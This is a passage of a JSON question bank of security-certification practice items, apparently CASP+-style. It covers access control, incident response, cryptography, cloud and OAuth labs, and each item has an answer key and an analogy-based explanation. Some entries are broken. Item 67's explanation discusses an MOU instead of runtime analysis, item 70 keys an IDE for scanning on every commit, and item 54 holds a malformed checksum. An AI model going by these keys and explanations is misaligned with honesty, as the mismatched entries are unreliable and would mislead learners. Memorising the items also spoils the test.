IPs to access the files.","B":"Assign labels to the files and require formal access authorization.","C":"Assign attributes to each file and allow authorized users to share the files.","D":"Assign roles to users and authorize access to files based on the roles."},"answer":"B","explanation":"Clearance plus owner-approved need-to-know is mandatory access control. Label each file with its classification and require a formal authorization that matches the person’s clearance and the owner’s approval.\n\nImagine color-coded folders in a locked room: even a manager with a gold badge still needs the file owner to say they may open that gold folder.","choose":1,"pbq":false,"exhibits":[]},{"id":47,"domain":4,"stem":"A security team receives alerts regarding impossible travel and possible brute-force attacks after normal business hours. After reviewing more logs, the team determines that specific users were targeted and attempts were made to transfer data to an unknown site. Which of the following should the team do to help mitigate these issues?","options":{"A":"Create a firewall rule to prevent those users from accessing sensitive data.","B":"Restrict uploading activity to only authorized sites.","C":"Enable packet captures to continue to run for the source and destination related to the file transfer.","D":"Disable login activity for those users after business hours."},"answer":"B","explanation":"After-hours impossible travel, brute force, and a push to an unknown site. Stop the upload path: only approved destinations.\n\nFirewalling those users from data or killing after-hours login may halt work without stopping a token that is already in.\n\nImagine locking the loading dock so boxes only go to listed trucks.","choose":1,"pbq":false,"exhibits":[]},{"id":48,"domain":3,"stem":"A company recently acquired a SaaS company and performed a gap analysis. The results of the gap analysis Indicate security controls are absent throughout the SDLC and have led to several vulnerable production releases. Which of the following security tools best reduces the risk of vulnerable code being pushed to production in the future?","options":{"A":"Static application security testing","B":"Regression testing","C":"Code signing","D":"Sandboxing"},"answer":"A","explanation":"Vulnerable releases escaped because code was never checked before it shipped. SAST reads source at build time and flags dangerous patterns so they die in the pipeline, not in production.\n\nImagine a spell-checker that runs before the book is printed, not after it is on store shelves.","choose":1,"pbq":false,"exhibits":[]},{"id":49,"domain":4,"stem":"Which of the following is the best reason for obtaining file hashes from a confiscated laptop?","options":{"A":"To prevent metadata tampering on each file","B":"To later validate the integrity of each file","C":"To generate unique identifiers for each file","D":"To preserve the chain of custody of files"},"answer":"B","explanation":"Hashes from a seized laptop let you prove later the file is the same bytes — integrity.\n\nChain of custody is the log of who held the bag. A hash is the seal number.\n\nImagine photographing a serial number so you can show the gadget was not swapped.","choose":1,"pbq":false,"exhibits":[]},{"id":50,"domain":4,"stem":"A security analyst is using data provided from a recent penetration test to calculate CVSS scores to prioritize remediation. Which of the following metric groups would the analyst need to determine to get the overall scores? (Choose three.)","options":{"A":"Temporal","B":"Availability","C":"Integrity","D":"Confidentiality","E":"Base","F":"Environmental","G":"Impact H Attack vector"},"answer":"A,E,F","explanation":"A full CVSS v3 score needs Base, Temporal, and Environmental groups. Confidentiality/Integrity/Availability are pieces inside Base, not three extra groups.\n\nImagine a price tag that needs sticker price, current discounts, and your local tax — all three — to print the number you will pay.","choose":3,"pbq":false,"exhibits":[]},{"id":51,"domain":1,"stem":"Which of the following describes how a risk assessment is performed when an organization has a critical vendor that provides multiple products?","options":{"A":"At the individual product level","B":"Through the selection of a random product","C":"Using a third-party audit report","D":"By choosing a major product"},"answer":"A","explanation":"One vendor can ship ten products with ten different risk pictures. Assessing 'the vendor' as a single blob hides a dangerous product behind a safe one.\n\nAssess each product, then roll the results up to the relationship.\n\nImagine a grocery supplier: you do not bless every item on the truck because the milk was fine last month. You check the meat separately.\n\nA random sample or a single flagship product is a shortcut that misses the item that actually holds your data.","choose":1,"pbq":false,"exhibits":[]},{"id":52,"domain":3,"stem":"A security engineer is performing a vulnerability management scan on multihomed Linux systems. The engineer notices that the vulnerability count is high due to the fact that each vulnerability is multiplied by the number of NICs on each system. Which of the following should the engineer do to deduplicate the vulnerabilities and to associate the vulnerabilities with a particular host?","options":{"A":"Use a SCAP scanner.","B":"Deploy an agent.","C":"Initiate a discovery scan.","D":"Perform an Nmap scan."},"answer":"B","explanation":"A network scan of a multi-NIC host reports the same CVE once per address, so counts explode. An agent runs on the host, reports one inventory identity, and ties every finding to that machine.\n\nImagine a person with three phone numbers getting three library cards; give them one card tied to their name instead.","choose":1,"pbq":false,"exhibits":[]},{"id":53,"domain":1,"stem":"Which of the following best describes a risk associated with using facial recognition to locally authenticate to a mobile device?","options":{"A":"Data remanence","B":"Deepfake","C":"Metadata scraping","D":"Biometric impersonation"},"answer":"D","explanation":"On-device face unlock can be fooled with a photo, a mask, or another stand-in for the real face. That risk is biometric impersonation.\n\nImagine unlocking a phone with a printed picture of the owner held up to the camera.\n\nDeepfakes are a related idea for video, but the classic mobile risk CompTIA is naming here is presenting a fake biometric to the local sensor.","choose":1,"pbq":false,"exhibits":[]},{"id":54,"domain":1,"stem":"The principal security analyst for a global manufacturer is investigating a security incident related to abnormal behavior in the ICS network. A controller was restarted as part of the troubleshooting process, and the following issue was identified when the controller was restarted: SECURE BOOT FAILED: FIRMWARE MISMATCH EXPECTED UXFDC479 ACTUAL 0x79F31B During the investigation, this modified firmware version was identified on several other controllers at the site. The official vendor firmware versions do not have this checksum. Which of the following stages of the MITRE ATT&CK framework for ICS includes this technique?","options":{"A":"Evasion","B":"Persistence","C":"Collection","D":"Lateral movement"},"answer":"B","explanation":"After a restart, several ICS controllers still run firmware whose checksum is not the vendor's. The attacker code survived the reboot.\n\nIn ATT&CK for ICS that is persistence: stay on the box after a restart.\n\nImagine a thermostat that keeps a stranger's program even after you flip the breaker. That is not a one-time visit; the stranger lives there now.\n\nEvasion would be hiding. Collection would be reading data. Lateral movement would be jumping to the next controller.","choose":1,"pbq":false,"exhibits":[]},{"id":55,"domain":3,"stem":"A web service provider has just taken on a very large contract that comes with requirements that are currently not being implemented. In order to meet contractual requirements, the company must achieve the following thresholds: 99.99% uptime Load time in 3 seconds - Response time = <1.0 seconds - Starting with the computing environment, which of the following should a security engineer recommend to best meet the requirements? (Choose three.)","options":{"A":"Installing a firewall at corporate headquarters","B":"Deploying a content delivery network","C":"Implementing server clusters","D":"Employing bare-metal loading of applications","E":"Lowering storage input/output","F":"Implementing RAID on the backup servers","G":"Utilizing redundant power for all developer workstations"},"answer":"B,C,D","explanation":"The contract is speed and uptime for a huge audience. A CDN puts static content near users, clusters keep serving if one box dies, and bare-metal (or thin) loading cuts boot and runtime overhead.\n\nImagine a pizza chain: neighborhood stores (CDN), several ovens per store (cluster), and no extra furniture in the kitchen slowing the cooks.","choose":3,"pbq":false,"exhibits":[]},{"id":56,"domain":4,"stem":"An analyst is working to address a potential compromise of a corporate endpoint and discovers the attacker accessed a user's credentials. However, it is unclear if the system baseline was modified to achieve persistence. Which of the following would most likely support forensic activities in this scenario?","options":{"A":"Side-channel analysis","B":"Bit-level disk duplication","C":"Software composition analysis","D":"SCAP scanner"},"answer":"B","explanation":"Creds were used; you do not know if the disk was changed for persistence. Copy the disk bit-for-bit before anyone tidies it.\n\nImagine photographing a room before anyone vacuums.\n\nSCA and SCAP do not freeze that room.","choose":1,"pbq":false,"exhibits":[]},{"id":57,"domain":3,"stem":"A company is decommissioning old servers and hard drives that contain sensitive data. Which of the following best protects against data leakage?","options":{"A":"Purging","B":"Clearing","C":"Shredding","D":"Degaussing"},"answer":"C","explanation":"Clearing and purging are software wipes; a determined lab can sometimes still recover pieces. Physically shredding the platters makes reconstruction impractical.\n\nImagine running tax papers through a cross-cut shredder instead of hitting Delete on a filing-cabinet app.","choose":1,"pbq":false,"exhibits":[]},{"id":58,"domain":2,"stem":"An engineer has had scaling issues with a web application hosted on premises and would like to move to a serverless architecture. Which of the following cloud benefits would be BEST to utilize for this project?","options":{"A":"Cost savings for hosting","B":"Automation of resource provisioning","C":"Providing geo-redundant hosting","D":"Eliminating need to patch"},"answer":"B","explanation":"The pain is on-prem scaling. Serverless exists so the platform stands up capacity when load arrives — automated provisioning.\n\nGeo-redundancy and patching are other cloud perks. They are not why you leave a scaling fight.\n\nImagine a kitchen that grows extra burners only when the dinner rush hits, instead of buying a warehouse full of idle stoves.","choose":1,"pbq":false,"exhibits":[]},{"id":59,"domain":3,"stem":"An organization needs to classify its systems and data in accordance with external requirements. Which of the following roles is best qualified to perform this task?","options":{"A":"Systems administrator","B":"Data owner","C":"Data processor","D":"Data custodian","E":"Data steward"},"answer":"B","explanation":"External classification rules attach to the business meaning of the data. The data owner is the role accountable for that meaning and for the label; custodians and admins only store and move what the owner classified.\n\nImagine the chef deciding which dishes are “secret recipe,” while the dishwasher just handles the plates.","choose":1,"pbq":false,"exhibits":[]},{"id":60,"domain":3,"stem":"A company is developing an application that will be used to perform e-commerce transactions for a subscription-based service. The application must be able to use previously saved payment methods to perform recurring transactions. Which of the following is the most appropriate?","options":{"A":"Tokenization through an HSM","B":"Self-encrypting disks with field-level encryption","C":"NX/XN Implementation to minimize data retention","D":"Token-based access for application users","E":"Address space layout randomization"},"answer":"A","explanation":"Recurring charges should not keep raw card numbers in your app. A payment HSM turns the card into a token and keeps the real secret in hardware so you only store the stand-in.\n\nImagine a coat-check: you keep the ticket, the closet keeps the coat.","choose":1,"pbq":false,"exhibits":[]},{"id":61,"domain":3,"stem":"A security technician is trying to connect a remote site to the central office over a site-to-site VPN. The technician has verified the source and destination IP addresses are correct, but the technician is unable to get the remote site to connect. The following error message keeps repeating: An error has occurred during Phase 1 handshake. Deleting keys and retrying... Which of the following is most likely the reason the connection is failing?","options":{"A":"The IKE hashing algorithm uses different key lengths on each VPN device.","B":"The IPSec settings allow more than one cipher suite on both devices.","C":"The Diffie-Hellman group on both sides matches but is a legacy group.","D":"The remote VPN is attempting to connect with a protocol other than SSL/TLS."},"answer":"A","explanation":"IKE Phase 1 negotiates how both sides hash and authenticate the handshake. If the hash algorithm or its key length does not match, Phase 1 never finishes and keys are deleted and retried.\n\nImagine two people trying to shake hands where one expects a three-knock secret and the other expects four.","choose":1,"pbq":false,"exhibits":[]},{"id":62,"domain":3,"stem":"A security analyst received the following finding from a cloud security assessment tool: Virtual Machine Data Disk is encrypted with the default encryption key. Because the organization hosts highly sensitive data files, regulations dictate it must be encrypted so It is unreadable to the CSP. Which of the following should be implemented to remediate the finding and meet the regulatory requirement? (Choose two.)","options":{"A":"Disk encryption with customer-provided keys","B":"Disk encryption with keys from a third party","C":"Row-level encryption with a key escrow","D":"File-level encryption with cloud vendor-provided keys","E":"File-level encryption with customer-provided keys","F":"Disk-level encryption with a cross-signed certificate"},"answer":"A,E","explanation":"Default cloud disk keys are often ones the provider can also use. Regulations that say the CSP must not be able to read the data require a customer-managed key, typically in a cloud HSM/KMS you control.\n\nImagine a storage unit whose spare key also hangs in the landlord’s office; you replace the lock with one only you hold.","choose":2,"pbq":false,"exhibits":[]},{"id":63,"domain":4,"stem":"A security analyst discovers a new device on the company's dedicated IoT subnet during the most recent vulnerability scan. The scan results show numerous open ports and insecure protocols in addition to default usernames and passwords. A camera needs to transmit video to the security server in the IoT subnet. Which of the following should the security analyst recommend to securely operate the camera?","options":{"A":"Harden the camera configuration.","B":"Send camera logs to the SIEM.","C":"Encrypt the camera's video stream.","D":"Place the camera on an isolated segment."},"answer":"A","explanation":"A new camera on the IoT net has default passwords and open ports. It must still send video to the security server on that same net.\n\nHarden it first: change defaults, close extra ports, force a protected stream.\n\nLogs and a new VLAN come after the camera is not a default-password brick.\n\nImagine changing the locks on a new side door before you invite it to stay.","choose":1,"pbq":false,"exhibits":[]},{"id":64,"domain":1,"stem":"The Chief Information Security Officer of a large multinational organization has asked the security risk manager to use risk scenarios during a risk analysis. Which of the following is the most likely reason for this approach?","options":{"A":"To connect risks to business objectives","B":"To ensure a consistent approach to risk","C":"To present a comprehensive view of risk","D":"To provide context to the relevancy of risk"},"answer":"A","explanation":"Risk scenarios exist to show how a technical event hits a business goal: revenue, safety, license to operate.\n\nThat is why the CISO asked for them.\n\nImagine telling the board 'a plant PLC was changed' versus 'that change would stop the line that makes 40% of this quarter's orders.' The second sentence is a scenario tied to an objective.\n\nConsistency and completeness are good hygiene. They are not the main reason to use scenarios.","choose":1,"pbq":false,"exhibits":[]},{"id":65,"domain":1,"stem":"A security engineer would like to control configurations on mobile devices while fulfilling the following requirements: Support and control Apple and Android devices. The device must be corporate-owned. Which of the following would enable the engineer to meet these requirements? (Choose two.)","options":{"A":"Create a group policy to lock down mobile devices.","B":"Update verbiage in the acceptable use policy for the internet.","C":"Implement an MDM solution.","D":"Implement a captive portal solution.","E":"Update policy to prohibit the use of BYOD devices.","F":"Implement a RADIUS solution."},"answer":"C,E","explanation":"The engineer must control Apple and Android that the company owns. Group Policy is a Windows-domain tool. A captive portal is a guest Wi-Fi page.\n\nMDM is how you inventory and enforce settings on those phones. A policy that BYOD is out of scope keeps personal devices off that managed fleet.\n\nImagine a company car: a fleet tracker (MDM) plus a rule that staff may not use their own cars for the same routes.\n\nRADIUS or an AUP sentence will not push a passcode policy to an iPhone.","choose":2,"pbq":false,"exhibits":[]},{"id":66,"domain":4,"stem":"A pharmaceutical company uses a cloud provider to host thousands of independent resources in object storage. The company needs a practical and effective means of discovering data, monitoring changes, and identifying suspicious activity. Which of the following would best meet these requirements?","options":{"A":"A machine-learning-based data security service","B":"A file integrity monitoring service","C":"A cloud configuration assessment and compliance service","D":"An automated data classification system"},"answer":"A","explanation":"Thousands of object-store blobs need discovery, change watch, and odd-behavior flags. A machine-learning data-security service scales that job.\n\nFIM is for known file trees. Config compliance is for settings.\n\nImagine a warehouse camera that learns what 'normal piles' look like and taps you when a pile walks out.","choose":1,"pbq":false,"exhibits":[]},{"id":67,"domain":3,"stem":"A security analyst is assessing a new application written in Java. The security analyst must determine which vulnerabilities exist during runtime. Which of the following would provide the most exhaustive list of vulnerabilities while meeting the objective?","options":{"A":"Input validation","B":"Dynamic analysis","C":"Side-channel analysis","D":"Fuzz testing","E":"Static analysis"},"answer":"B","explanation":"Two firms in the same trade want to share threat work without creating a paid contract. An MOU writes down the shared intent and how they will cooperate.\n\nImagine two neighbor watches posting a one-page note: we will share suspicious-car plates, no money changes hands.","choose":1,"pbq":false,"exhibits":[]},{"id":68,"domain":3,"stem":"Recently, two large engineering companies in the same line of business decided to approach cyberthreats in a united way. Which of the following best describes this unified approach?","options":{"A":"NDA","B":"SOW","C":"SLA","D":"MOU"},"answer":"D","explanation":"An MOU records the united cyber approach. An SLA would promise measurable service; an SOW would define paid work.\n\nImagine two gyms agreeing in writing to share banned-member lists without merging the businesses.","choose":1,"pbq":false,"exhibits":[]},{"id":69,"domain":1,"stem":"A regulated company is in the process of refreshing its entire infrastructure. The company has a business-critical process running on an old 2008 Windows server. If this server fails, the company would lose millions of dollars in revenue. Which of the following actions should the company should take?","options":{"A":"Accept the risk as the cost of doing business.","B":"Create an organizational risk register for project prioritization.","C":"Implement network compensating controls.","D":"Purchase insurance to offset the cost if a failure occurred."},"answer":"B","explanation":"A 2008 box that would cost millions if it died is not 'the cost of doing business' and not something insurance alone should hide. It has to compete for refresh money.\n\nPut it on the organizational risk register so the infrastructure project funds it in priority order.\n\nImagine a hospital whiteboard: the crashing server is a named patient with a cost, not a rumor in the hallway.\n\nA network ACL does not replace a dead operating system.","choose":1,"pbq":false,"exhibits":[]},{"id":70,"domain":3,"stem":"A security engineer needs to ensure production containers are automatically scanned for vulnerabilities before they are accepted into the production environment. Which of the following should the engineer use to automatically incorporate vulnerability scanning on every commit?","options":{"A":"Code repository","B":"CI/CD pipeline","C":"Integrated development environment","D":"Container orchestrator"},"answer":"C","explanation":"The bank’s answer is to put the scanner in the IDE so each commit is checked where the developer works (shift-left). In live programs the same gate is usually also enforced in CI/CD so a laptop without the plugin cannot skip it.\n\nImagine a spell-check that runs in the author’s word processor the moment they save the chapter.","choose":1,"pbq":false,"exhibits":[]},{"id":71,"domain":2,"stem":"A security architect recommends replacing the company's monolithic software application with a containerized solution. Historically, secrets have been stored in the application's configuration files. Which of the following changes should the security architect make in the new system?","options":{"A":"Use a secrets management tool.","B":"Save secrets in key escrow.","C":"Store the secrets inside the Dockerfiles.","D":"Run all Dockerfiles in a randomized namespace."},"answer":"A","explanation":"Secrets used to live in config files. Containers will copy those files into every image if you leave them there.\n\nA secrets manager hands the secret to the running service and can rotate it. Putting secrets in the Dockerfile reprints the doormat key.\n\nImagine a hotel key desk, not a spare key taped under every room's mat.","choose":1,"pbq":false,"exhibits":[]},{"id":72,"domain":3,"stem":"A security engineer is assessing a new tool to segment data and communications between domains. The assessment must determine how data transmission controls can be bypassed without detection. Which of the following techniques should the security engineer use?","options":{"A":"Machine-learning statistical analysis","B":"Fuzz testing","C":"Covert channel analysis","D":"Protocol analysis"},"answer":"C","explanation":"The assessment question is “how can data sneak across the domain boundary without the official channel noticing?” That study is covert-channel analysis.\n\nImagine checking whether prisoners are tapping on pipes to send messages the hallway cameras never see.","choose":1,"pbq":false,"exhibits":[]},{"id":73,"domain":3,"stem":"During an adversarial simulation exercise, an external team was able to gain access to sensitive information and systems without the organization detecting this activity. Which of the following mitigation strategies should the organization use to best resolve the findings?","options":{"A":"Configuring a honeypot for adversary characterization","B":"Leveraging simulators for attackers","C":"Setting up a honey network for attackers","D":"Utilizing decoy accounts and documents"},"answer":"D","explanation":"The red team lived in the environment with no alert. Decoy accounts and documents (honeytokens) are tripwires: anyone who touches them is almost certainly an intruder.\n\nImagine leaving a clearly labeled “master key envelope” in a drawer that no honest employee would open; if it moves, you know.","choose":1,"pbq":false,"exhibits":[]},{"id":74,"domain":3,"stem":"A help desk technician is troubleshooting an issue with an employee's laptop that will not boot into its operating system. The employee reported the laptop had been stolen but then found it one day later. The employee has asked the technician for help recovering important data. The technician has identified the following: The laptop operating system was not configured with BitLocker. The hard drive has no hardware failures. Data is present and readable on the hard drive, although it appears to be illegible. Which of the following is the most likely reason the technician is unable to retrieve legible data from the hard drive?","options":{"A":"The employee's password was changed, and the new password needs to be used.","B":"The PKI certificate was revoked, and a new one must be installed.","C":"The hard drive experienced crypto-shredding.","D":"The technician is using the incorrect cipher to read the data."},"answer":"C","explanation":"The laptop was stolen overnight, BitLocker was off, the drive still spins, but the files look like noise. Crypto-shredding means the encryption keys were wiped, so the ciphertext that remains cannot be turned back into documents.\n\nImagine a diary written in a cipher whose only codebook was burned; the pages are still there, but they are unreadable.","choose":1,"pbq":false,"exhibits":[]},{"id":75,"domain":4,"stem":"SIMULATION You are about to enter the virtual environment. DO NOT perform the following actions within the virtual environment. Making any of these changes will cause the virtual environment to fail and prevent proper scoring. 1. Disable ssh 2. Disable systemd 3. Alter the network adapter 172.162.0.0 4. Change the password on the lab admin account 5. Reboot the machine Once you have completed the item in the virtual environment, you will NOT be allowed to return to this item. TEST QUESTION This system was recently patched following the exploitation of a vulnerability by an attacker to enable data exfiltration. Despite the vulnerability being patched, it is likely that a malicious TCP service is still running and the adversary has achieved persistence by creating a systemd service. Examples of commands to use: • kill, killall • lsof • man, --help (use for assistance) • netstat (useful flags: a, n, g, u) • ps (useful flag: a) • systemctl (to control systemd) Please note: the list of commands shown above is not exhaustive. All native commands are available. INSTRUCTIONS Using the following credentials: • Username: labadmin • Password: Passw0rd! Investigate to identify indicators of compromise and then remediate them. You will need to make at least two changes: 1. End the compromised process that is using a malicious TCP service. 2. Remove the malicious persistence agent by disabling the service's ability to start on boot.","options":{},"answer":"","explanation":"Lab: a patched box still has a malicious TCP listener and a systemd unit that brings it back at boot.\n\nKill the process that owns that port, then disable the unit so it cannot start again.\n\nImagine unplugging a hidden radio and taking the batteries out of the backup radio.","choose":1,"pbq":true,"exhibits":["exhibits/q075_1.png"]},{"id":76,"domain":2,"stem":"HOTSPOT • You are tasked with integrating a new B2B client application with an existing OAuth workflow that must meet the following requirements: • THE application does not need to know the users’ credentials. • An approval interaction between the users and the HTTP service must be orchestrated. • The application must have limited access to users’ data. INSTRUCTIONS • Use the drop-down menus to select the action items for the appropriate locations. All placeholders must be filled. • If at any time you would like to bring back the initial state of the simulation, please click the Reset All button.","options":{},"answer":"","explanation":"This lab is OAuth: the app must not see passwords, must orchestrate user approval, and must get limited access. Those are authorization-code (or equivalent) plus a scoped token — not a password grant.\n\nImagine a valet who gets a ticket to park the car but never gets your house keys.","choose":1,"pbq":true,"exhibits":["exhibits/q076_1.png","exhibits/q076_2.png"]},{"id":77,"domain":3,"stem":"SIMULATION • - An IPSec solution is being deployed. The configuration files for both the VPN concentrator and the AAA server are shown in the diagram. • The EAP method must use mutual certificate-based authentication (with issued client certificates). • The IKEv2 cipher suite must be configured to the most secure authenticated mode of operation. • The secret must contain at least one uppercase character, one lowercase character, one numeric character, and one special character, and it must meet a minimum length requirement of eight characters. INSTRUCTIONS • - Click on the AAA server and VPN concentrator to complete the configuration. Fill in the appropriate fields and make selections from the drop-down menus. If at any time you would like to bring back the initial state of the simulation, please click the Reset All button.","options":{},"answer":"","explanation":"This IPsec lab needs three things at once: EAP-TLS so both sides present certificates, the strongest IKEv2 authenticated cipher suite the dropdowns allow, and a pre-shared secret that meets the length and character-class rules.\n\nImagine two locksmiths cutting matching keys: same keyway, same high-security pins, and a password on the work order that is actually complex.","choose":1,"pbq":true,"exhibits":["exhibits/q077_1.png","exhibits/q077_2.png"]},{"id":78,"domain":4,"stem":"SIMULATION An incident occurred at Site A when an attacker successfully caused water pressure to increase in the pump room. The organization is concerned about reoccurrence of this attack and that similar attacks might be successful on other cyber-physical systems within the network. All devices and components reside on a flat network within the 10.1.0.0/16 space. INSTRUCTIONS Take the appropriate actions to reduce the risk of reoccurrence of this and other environmental security vulnerabilities. Select the component(s) at Sites A and B that have environmental impact potential. Then, select the corrective action that will best reduce the risk of incident reoccurrence. If at any time you would like to bring back the initial state of the simulation, please click the Reset All button.","options":{},"answer":"","explanation":"Lab: a pump-room attack on a flat 10.1.0.0/16 plant net. Mark the cyber-physical pieces and segment or filter so a second site cannot be driven the same way.\n\nImagine putting the boiler on its own locked hallway after someone cranked the pressure from a laptop in the lobby.","choose":1,"pbq":true,"exhibits":["exhibits/q078_1.png"]},{"id":79,"domain":4,"stem":"SIMULATION • - During the course of normal SOC operations, three anomalous events occurred and were flagged as potential IoCs. Evidence for each of these potential IoCs is provided. • - INSTRUCTIONS • - Review each of the events and select the appropriate analysis and action options for each IoC. If at any time you would like to bring back the initial state of the simulation, please click the Reset All button.","options":{},"answer":"","explanation":"Lab: three SOC events. For each IoC pick the analysis that matches the evidence (true/false, what family of activity) and the action that follows (contain, monitor, close).\n\nImagine three night-shift radio calls: decide which are real fires and which hose to pull.","choose":1,"pbq":true,"exhibits":["exhibits/q079_1.png","exhibits/q079_2.png"]},{"id":80,"domain":4,"stem":"A security administrator needs to automate alerting. The server generates structured log files that need to be parsed to determine whether an alarm has been triggered. The parser is shown in the exhibit (json.load, then parsed_log[\"error_log\"][\"system_1\"][\"InAlarmState\"]). Which of the following is most likely the log input that the code will parse?","options":{"A":"YAML: error_log / system_1 / InAlarmState: True","B":"<\"error_log\"><\"system_1\">","C":"Indented list-style text with quoted keys (not valid JSON)","D":"{\"error_log\": {\"system_1\": {\"InAlarmState\": true}}}"},"answer":"D","explanation":"The function calls json.load and then walks error_log → system_1 → InAlarmState. Only a real JSON object with those nested keys will parse. YAML, XML, and indented pseudo-JSON will throw or miss the keys.\n\nImagine a vending machine that only accepts coins in a labeled slot; loose change dumped in the hopper is ignored.","choose":1,"pbq":false,"exhibits":["exhibits/q080_1.png","exhibits/q080_2.png","exhibits/q080_3.png"]},{"id":81,"domain":3,"stem":"A financial technology firm works collaboratively with business partners in the industry to share threat intelligence within a central platform. This collaboration gives partner organizations the ability to obtain and share data associated with emerging threats from a variety of adversaries. Which of the following should the organization most likely leverage to facilitate this activity? (Choose two.)","options":{"A":"CWPP","B":"YARA","C":"ATT&CK","D":"STIX","E":"TAXII","F":"JTAG"},"answer":"D,E","explanation":"STIX is the language for describing threat objects; TAXII is the delivery protocol that pushes or pulls those objects between partners.\n\nImagine a shared recipe card format (STIX) and the courier route that moves the cards between restaurants (TAXII).","choose":2,"pbq":false,"exhibits":[]},{"id":82,"domain":2,"stem":"A company wants to invest in research capabilities with the goal to operationalize the research output. Which of the following is the best option for a security architect to recommend?","options":{"A":"Dark web monitoring","B":"Threat intelligence platform","C":"Honeypots","D":"Continuous adversary emulation"},"answer":"B","explanation":"Research that must become daily defense needs a place to store, score, and push indicators into tools. That place is a threat intelligence platform.\n\nDark-web watching and honeypots collect. Emulation tests. None of those operationalizes the feed by itself.\n\nImagine a newsroom that turns field notes into a rundown the whole station can run, not a pile of clippings on one desk.","choose":1,"pbq":false,"exhibits":[]},{"id":83,"domain":4,"stem":"A company is concerned about the security of customer data. The IT department has configured all web applications with appropriate access controls to restrict to only authorized users. Which of the following solutions addresses this concern?","options":{"A":"SIEM","B":"Vulnerability scanner","C":"DLP","D":"Threat intelligence platform"},"answer":"C","explanation":"Access control is already on the apps. The leftover worry is customer data leaving through mail, web, or stick.\n\nThat control is DLP.\n\nSIEM watches. A scanner finds holes. Neither stops the file at the door.\n\nImagine a mailroom stamp-checker, not another camera in the hallway.","choose":1,"pbq":false,"exhibits":[]},{"id":84,"domain":1,"stem":"A security analyst reviews the following report: Which of the following assessments is the analyst performing?","options":{"A":"System","B":"Supply chain","C":"Quantitative","D":"Organizational"},"answer":"B","explanation":"The report traces components and who supplied them. That is a supply-chain assessment, not a system scan or a dollar-loss model.\n\nImagine reading the ingredient label and the farm list on a frozen dinner, not weighing the dinner.\n\nQuantitative math needs dollars. Organizational assessments look at the whole firm. This page is about who built the parts.","choose":1,"pbq":false,"exhibits":["exhibits/q084_1.png"]},{"id":85,"domain":3,"stem":"A security researcher tells a company that one of its solutions is vulnerable to buffer overflow, leading to a malicious coding execution. Which of the following is the BEST way to avoid this vulnerability in future versions?","options":{"A":"Testing for CSRF vulnerabilities before the application goes to production","B":"Using SAST tools to find vulnerabilities as part of the pipeline","C":"Implementing canary protection in an earlier life-cycle stage","D":"Implementing pair programming to improve development capabilities"},"answer":"B","explanation":"A buffer overflow is a code defect. SAST reads source or bytecode in the pipeline and flags those memory bugs before a build is released.\n\nImagine a spell-checker that runs before the book is printed so the same typo does not ship again.","choose":1,"pbq":false,"exhibits":[]},{"id":86,"domain":3,"stem":"Users are experiencing a variety of issues when trying to access corporate resources. Examples include: • Connectivity issues between local computers and file servers between branch offices • Inability to download corporate applications on mobile endpoints while working remotely • Certificate errors when accessing internal web applications Which of the following actions are the most relevant when troubleshooting the reported issues? (Choose two.)","options":{"A":"Review VPN throughput.","B":"Check IDS rules.","C":"Restore static content on the CDN.","D":"Enable secure authentication using NAC.","E":"Implement advanced WAF rules.","F":"Validate MDM asset compliance."},"answer":"A,F","explanation":"Branch file-share slowness plus remote app install failures plus broken internal certificates points at two planes at once: the remote path (VPN capacity) and whether the phone or laptop is actually marked compliant in MDM.\n\nImagine a delivery van that is both stuck in traffic and carrying expired ID badges for the warehouse gate.","choose":2,"pbq":false,"exhibits":[]},{"id":87,"domain":3,"stem":"A network engineer recorded the following test results: After a new network security appliance was deployed, the results of the network test are as follows: Which of the following network infrastructure components most likely produced these results?","options":{"A":"IPS","B":"CDN","C":"VPN","D":"IDS"},"answer":"A","explanation":"After the new box went in, traffic that used to pass is now dropped or reset. An IPS sits in line and can block; an IDS only watches.\n\nImagine a security door that now slams shut versus a camera that only records the same hallway.","choose":1,"pbq":false,"exhibits":["exhibits/q087_1.png","exhibits/q087_2.png"]},{"id":88,"domain":3,"stem":"A developer needs to improve the cryptographic strength of a password-storage component in a web application without completely replacing the crypto-module. Which of the following is the most appropriate technique?","options":{"A":"Key splitting","B":"Key escrow","C":"Key rotation","D":"Key encryption","E":"Key stretching"},"answer":"E","explanation":"Key stretching (PBKDF2, bcrypt, scrypt, Argon2) runs a password through many slow rounds so a stolen hash file takes far longer to crack.\n\nImagine a lock that makes you turn the key ten thousand extra times; a thief with a ring of keys no longer finishes tonight.","choose":1,"pbq":false,"exhibits":[]},{"id":89,"domain":3,"stem":"A company wants to implement hardware security key authentication for accessing sensitive information systems. The goal is to prevent unauthorized users from gaining access with a stolen password. Which of the following models should the company implement to best solve this issue?","options":{"A":"Rule-based","B":"Time-based","C":"Role-based","D":"Context-based"},"answer":"D","explanation":"A stolen password is only one factor. Requiring a hardware security key adds a physical device as extra context, so the password alone is not enough.\n\nImagine a safe that opens only when you know the combination and also plug in a unique USB stick.","choose":1,"pbq":false,"exhibits":[]},{"id":90,"domain":2,"stem":"Which of the following is the main reason quantum computing advancements are leading companies and countries to deploy new encryption algorithms?","options":{"A":"Encryption systems based on large prime numbers will be vulnerable to exploitation.","B":"Zero Trust security architectures will require homomorphic encryption.","C":"Perfect forward secrecy will prevent deployment of advanced firewall monitoring techniques.","D":"Quantum computers will enable malicious actors to capture IP traffic in real time."},"answer":"A","explanation":"Large quantum machines break the prime-factor math behind RSA-style public key crypto. That is why new algorithms are being deployed.\n\nThey do not magically sniff every packet on the wire.\n\nImagine a padlock whose combination a future machine can run through in an afternoon. You change the lock style, not the door thickness.","choose":1,"pbq":false,"exhibits":[]},{"id":91,"domain":2,"stem":"A company is adopting microservice architecture in order to quickly remediate vulnerabilities and deploy to production. All of the microservices run on the same Linux platform. Significant time was spent updating the base OS before deploying code. Which of the following should the company do to make the process efficient?","options":{"A":"Use Terraform scripts while creating golden images.","B":"Create a cron job to run apt-update every 30 days.","C":"Use snapshots to deploy code to existing compute instances.","D":"Deploy a centralized update server."},"answer":"A","explanation":"Every microservice shares one Linux base, and hand-updating that base is the delay. Bake the base once (golden image) and stamp hosts from it with Terraform.\n\nA cron apt-get on live boxes is the old delay.\n\nImagine a cookie cutter: change the cutter when the recipe is recalled, press a new batch, stop icing each cookie by hand.","choose":1,"pbq":false,"exhibits":[]},{"id":92,"domain":2,"stem":"During a gap assessment, an organization notes that BYOD usage is a significant risk. The organization implemented administrative policies prohibiting BYOD usage. However, the organization has not implemented technical controls to prevent the unauthorized use of BYOD assets when accessing the organization's resources. Which of the following solutions should the organization implement to best reduce the risk of BYOD devices? (Choose two.)","options":{"A":"Cloud IAM, to enforce the use of token-based MFA","B":"Conditional access, to enforce user-to-device 